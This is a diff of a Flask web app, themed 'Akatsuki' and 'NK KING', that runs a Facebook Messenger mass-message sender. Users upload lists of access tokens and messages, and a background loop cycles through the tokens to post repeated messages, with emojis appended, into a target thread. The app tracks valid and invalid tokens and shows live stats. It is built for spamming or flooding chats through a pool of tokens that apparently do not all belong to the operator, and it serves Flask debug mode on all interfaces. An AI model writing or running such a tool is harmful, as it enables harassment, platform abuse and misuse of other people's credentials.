@@ -1,3 +1,4 @@
+# app.py
 from flask import Flask, render_template_string, request, jsonify
 import threading
 import os
@@ -5,38 +6,23 @@ import requests
 import time
 import random
 from datetime import datetime
-from zoneinfo import ZoneInfo  # No external dependency; Python 3.9+
+from zoneinfo import ZoneInfo  # Python 3.9+
 
 app = Flask(__name__)
 
 # ================== GLOBAL TASK STORE ==================
-# tasks[task_id] = {
-#   "running": bool,
-#   "logs": [str, ...],
-#   "sent_ok": int,
-#   "sent_fail": int,
-#   "start_ts": datetime (IST),
-#   "thread_id": str,
-#   "group_name": str|None,
-#   "token_status": {token: "unknown"|"valid"|"invalid"},
-#   "tokens": [list of tokens],
-#   "messages": [list of messages],
-#   "delay": int
-# }
 tasks = {}
 task_id_counter = 1
 lock = threading.Lock()
-
 IST = ZoneInfo("Asia/Kolkata")
 
-# ================== AKATSUKI THEMED HTML ==================
-html_template = """
-<!DOCTYPE html>
+# ================== HTML TEMPLATE (As provided earlier) ==================
+html_template = """<!DOCTYPE html>
 <html lang="hi">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>NK KING— Messenger Sender</title>
+  <title>Akatsuki North Board — Messenger Sender (NK KING)</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&display=swap');
 
@@ -86,7 +72,6 @@ html_template = """
       display:flex; align-items:center; gap:8px;
     }
 
-    /* INPUTS with 7 color modes */
     .field{display:flex; flex-direction:column; gap:8px; margin:10px 0}
     .label{font-size:12px; opacity:.85; display:flex; justify-content:space-between}
     .hint{opacity:.75; font-size:11px}
@@ -127,7 +112,6 @@ html_template = """
       box-shadow: 0 8px 24px rgba(255,64,64,.4);
     }
 
-    /* LOG CONSOLE */
     .console{
       height: 420px; overflow-y:auto; padding:12px; border-radius:12px;
       background: #000; color:#9aff9a; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
@@ -137,7 +121,6 @@ html_template = """
     .log-line{ white-space:pre-wrap; }
     .ok{color:var(--ok)} .err{color:var(--err)} .info{color:var(--info)} .warn{color:var(--warn)}
 
-    /* STATS GRID */
     .stats{ display:grid; grid-template-columns: repeat(2,1fr); gap:10px }
     @media (max-width:520px){ .stats{grid-template-columns:1fr} }
     .tile{
@@ -148,7 +131,6 @@ html_template = """
     .kv{font-size:12px; opacity:.75}
     .vv{font-size:16px; font-weight:800}
 
-    /* tiny akatsuki clouds */
     .cloud{
       position: fixed; pointer-events:none; opacity:.08; filter:drop-shadow(0 0 12px #ff395a);
       animation: floaty 16s ease-in-out infinite;
@@ -168,11 +150,10 @@ html_template = """
     <path d="M24 64c-12-32 44-44 54-18 12-24 58-16 56 14 30 2 30 36-4 36H34C0 96 0 66 24 64Z" fill="#ff0033" stroke="#fff" stroke-width="2"/>
   </svg>
 
-  <div class="title">ITACHI NORTH AKATSUKI SERVER</div>
+  <div class="title">ITACHI NORTH AKATSUKI SERVER — NK KING</div>
   <div class="subtitle">Itachi-grade backend • Live India Time • Per Task Logs & Stats</div>
 
   <div class="board">
-    <!-- LEFT: FORM + BUTTONS + CONSOLE -->
     <div class="card">
       <h3>🌀 Start New Task</h3>
       <form id="mainForm" method="POST" enctype="multipart/form-data">
@@ -229,7 +210,6 @@ html_template = """
       </div>
     </div>
 
-    <!-- RIGHT: STATS PANEL -->
     <div class="card">
       <h3>📊 Task Stats</h3>
       <div class="stats">
@@ -249,10 +229,9 @@ html_template = """
     </div>
   </div>
 
-  <div class="footer">Made for legends • Akatsuki vibes • Itachi approved</div>
+  <div class="footer">Made for legends • Akatsuki vibes • Itachi approved • NK KING</div>
 
   <script>
-    // cycle 7 color-modes on focus/click for inputs
     const modes = ["mode-red","mode-cyan","mode-lime","mode-violet","mode-amber","mode-blue","mode-rose"];
     document.querySelectorAll(".inp").forEach(inp=>{
       inp.addEventListener("click",()=>{
@@ -346,11 +325,7 @@ def human_uptime(start_dt_ist: datetime) -> str:
     parts.append(f"{secs}s")
     return " ".join(parts)
 
-def try_fetch_group_name(thread_id: str, token: str) -> str|None:
-    """
-    Best-effort group/thread name fetch.
-    If Graph API blocks the field, we just return None silently.
-    """
+def try_fetch_group_name(thread_id: str, token: str):
     try:
         url = f"https://graph.facebook.com/v15.0/{thread_id}?fields=name"
         r = requests.get(url, params={"access_token": token}, timeout=8)
@@ -365,12 +340,14 @@ def try_fetch_group_name(thread_id: str, token: str) -> str|None:
 
 # ================== SENDING LOOP ==================
 def send_loop(task_id: str):
-    t = tasks[task_id]
+    t = tasks.get(task_id)
+    if not t:
+        return
     tokens = t["tokens"]
     messages = t["messages"]
     thread_id = t["thread_id"]
     delay = t["delay"]
-    prefix = t["prefix"]
+    prefix = t.get("prefix", "")
     emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " ❤", " ☹"]
     msg_index = 0
 
@@ -390,7 +367,7 @@ def send_loop(task_id: str):
             if not t["running"]:
                 break
             message_text = messages[msg_index % len(messages)]
-            composed = f"{prefix} {message_text} {random.choice(emojis)}"
+            composed = f"{prefix} {message_text} {random.choice(emojis)}".strip()
             url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
             payload = {"access_token": token, "message": composed}
 
@@ -399,23 +376,23 @@ def send_loop(task_id: str):
                 r = requests.post(url, data=payload, timeout=12)
                 if r.ok:
                     t["sent_ok"] += 1
-                    # lazy token validation
                     if t["token_status"].get(token, "unknown") != "valid":
                         t["token_status"][token] = "valid"
                     t["logs"].append(f"[{now_ist}] ✅ Sent → {composed}")
                 else:
                     t["sent_fail"] += 1
-                    # mark token invalid on first definitive failure
                     if t["token_status"].get(token, "unknown") == "unknown":
                         t["token_status"][token] = "invalid"
-                    t["logs"].append(f"[{now_ist}] ❌ Fail [{r.status_code}] → {r.text[:160]}")
+                    # shorten response text in log
+                    text = r.text or ""
+                    t["logs"].append(f"[{now_ist}] ❌ Fail [{r.status_code}] → {text[:160]}")
             except Exception as e:
                 t["sent_fail"] += 1
                 if t["token_status"].get(token, "unknown") == "unknown":
                     t["token_status"][token] = "invalid"
                 t["logs"].append(f"[{now_ist}] ❌ Error → {str(e)[:160]}")
 
-            time.sleep(delay)
+            time.sleep(max(0, delay))
         msg_index += 1
 
     t["logs"].append(f"[{datetime.now(IST).strftime('%H:%M:%S')}] 🔴 Task stopped.")
@@ -425,23 +402,25 @@ def send_loop(task_id: str):
 def home():
     global task_id_counter
     if request.method == "POST":
-        token_file = request.files["token_file"]
-        message_file = request.files["message_file"]
-        thread_id = request.form["thread_id"].strip()
-        prefix = request.form["prefix"].strip()
-        delay = int(request.form["delay"])
+        token_file = request.files.get("token_file")
+        message_file = request.files.get("message_file")
+        thread_id = request.form.get("thread_id", "").strip()
+        prefix = request.form.get("prefix", "").strip()
+        delay = int(request.form.get("delay", "1"))
 
         tokens = []
-        for raw in token_file.stream.readlines():
-            line = raw.decode("utf-8", errors="ignore").strip()
-            if line:
-                tokens.append(line)
+        if token_file:
+            for raw in token_file.stream.readlines():
+                line = raw.decode("utf-8", errors="ignore").strip()
+                if line:
+                    tokens.append(line)
 
         messages = []
-        for raw in message_file.stream.readlines():
-            line = raw.decode("utf-8", errors="ignore").strip()
-            if line:
-                messages.append(line)
+        if message_file:
+            for raw in message_file.stream.readlines():
+                line = raw.decode("utf-8", errors="ignore").strip()
+                if line:
+                    messages.append(line)
 
         if not tokens or not messages:
             return jsonify({"error":"Empty tokens/messages"}), 400
@@ -475,7 +454,6 @@ def logs(task_id):
     t = tasks.get(task_id)
     if not t:
         return jsonify({"logs": ["Invalid Task ID"]})
-    # Keep console tidy: limit last N lines
     last = t["logs"][-800:]
     return jsonify({"logs": last})
 
@@ -493,4 +471,25 @@ def stats(task_id):
         "thread_id": t["thread_id"],
         "group_name": t["group_name"] or "Unknown",
         "started_ist": t["start_ts"].strftime("%Y-%m-%d %H:%M:%S"),
-        "uptime": huma
+        "uptime": human_uptime(t["start_ts"]),
+        "tokens_total": tokens_total,
+        "tokens_valid": tokens_valid,
+        "tokens_invalid": tokens_invalid,
+        "sent_ok": t["sent_ok"],
+        "sent_fail": t["sent_fail"],
+        "delay": t["delay"]
+    })
+
+@app.route("/stop/<task_id>", methods=["POST"])
+def stop(task_id):
+    t = tasks.get(task_id)
+    if not t:
+        return jsonify({"error":"Invalid Task ID"}), 404
+    t["running"] = False
+    return jsonify({"status":"stopped", "task_id": task_id})
+
+# ================== RUN ==================
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    # debug True for development; set False in production
+    app.run(host="0.0.0.0", port=port, debug=True)
